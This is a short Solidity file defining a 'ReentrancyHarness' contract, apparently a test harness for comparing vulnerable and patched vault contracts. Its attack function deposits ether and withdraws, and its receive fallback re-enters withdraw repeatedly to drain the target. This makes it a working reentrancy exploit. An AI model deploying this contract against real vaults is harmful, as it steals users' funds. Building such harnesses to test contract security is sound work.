// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWithdrawalVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyHarness {
    IWithdrawalVault public immutable target;
    uint256 public reentryCount;
    uint256 public maxReentries;

    constructor(address targetAddress) {
        require(targetAddress != address(0), "zero target");
        target = IWithdrawalVault(targetAddress);
    }

    function attack(uint256 requestedReentries) external payable {
        require(msg.value > 0, "zero attack deposit");

        reentryCount = 0;
        maxReentries = requestedReentries;

        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (
            reentryCount < maxReentries &&
            address(target).balance >= msg.value
        ) {
            reentryCount += 1;

            // A failed reentrant withdrawal must not revert the original
            // transfer, which allows the same harness to exercise both
            // controlled contract variants.
            try target.withdraw() {
                // Intentionally empty.
            } catch {
                // Intentionally empty.
            }
        }
    }
}
